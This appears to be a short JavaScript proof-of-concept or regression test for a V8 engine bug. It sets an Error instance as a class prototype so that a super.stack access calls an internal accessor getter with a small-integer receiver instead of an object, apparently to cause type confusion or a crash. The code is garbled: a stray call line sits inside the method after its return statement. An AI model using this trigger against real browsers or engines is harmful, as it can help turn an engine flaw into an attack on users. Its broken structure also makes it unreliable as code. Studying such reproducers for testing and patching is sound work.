// Create an Error instance. Error instances have an own property 'stack'
// which is an accessor backed by a FunctionTemplateInfo (API accessor).
const err = new Error();

class B {
  m() {
    // Access 'stack' via super.
    // The lookup starts at the prototype of B.prototype.
    return super.stack;
B.m.call(0x4141414 >> 1);

  }
}

// Set the prototype of B.prototype to the Error instance.
// Now, the super lookup will start at 'err'.
Object.setPrototypeOf(B.prototype, err);

const b = new B();

// Call the method m with a primitive receiver.
// This triggers LoadSuperIC and ultimately calls CallGetterIfAccessor with a
// Smi as receiver and the default kExpectingJSReceiver mode.
b.m.call(0x4141414 >> 1);